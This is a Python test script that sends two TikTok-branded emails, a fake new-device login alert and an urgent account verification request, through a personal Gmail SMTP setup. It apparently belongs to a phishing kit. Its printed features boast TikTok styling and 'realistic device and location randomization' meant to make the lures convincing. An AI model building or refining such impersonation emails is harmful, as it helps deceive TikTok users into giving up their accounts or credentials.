#!/usr/bin/env python3
"""
Test script for TikTok email functionality
This script demonstrates how to send different types of TikTok security emails
"""

from smtp import (
    send_tiktok_security_alert, 
    send_tiktok_verification_required
)

def main():
    """Main function to test TikTok email functionality"""
    
    # Test recipient email
    test_email = "moneybman0@gmail.com"
    test_username = "thee_great_bevan_mkhabele"
    
    print("🎵 TikTok Email System Test")
    print("=" * 40)
    
    # Test 1: Security Alert (New Device Login)
    print("\n📧 Test 1: Sending TikTok Security Alert...")
    print("   - Type: New device login detected")
    print("   - Includes: Device info, location, timestamp")
    print("   - Style: Dark theme with TikTok branding")
    
    success1 = send_tiktok_security_alert(
        recipient_email=test_email,
        alert_type="new_device",
        tiktok_username=test_username
    )
    
    if success1:
        print("   ✅ Security alert sent successfully!")
    else:
        print("   ❌ Failed to send security alert")
    
    # Test 2: Verification Required
    print("\n📧 Test 2: Sending TikTok Verification Email...")
    print("   - Type: Account verification required")
    print("   - Includes: Urgent banner, verification button")
    print("   - Style: High-priority design with red accents")
    
    success2 = send_tiktok_verification_required(
        recipient_email=test_email,
        tiktok_username=test_username
    )
    
    if success2:
        print("   ✅ Verification email sent successfully!")
    else:
        print("   ❌ Failed to send verification email")
    
    # Summary
    print("\n" + "=" * 40)
    print("📊 Test Results Summary:")
    print(f"   Security Alert: {'✅ PASS' if success1 else '❌ FAIL'}")
    print(f"   Verification Email: {'✅ PASS' if success2 else '❌ FAIL'}")
    
    if success1 and success2:
        print("\n🎉 All tests passed! TikTok emails are working correctly.")
        print("\n📱 Email Features:")
        print("   • Dark theme design matching TikTok's aesthetic")
        print("   • Responsive layout for mobile devices")
        print("   • TikTok brand colors (cyan/red gradient)")
        print("   • Professional security notification styling")
        print("   • Realistic device and location randomization")
        print("   • Multiple email templates available")
    else:
        print("\n⚠️  Some tests failed. Check your SMTP configuration.")
        print("   Make sure your Gmail credentials are correct and 2FA is properly configured.")

if __name__ == "__main__":
    main()
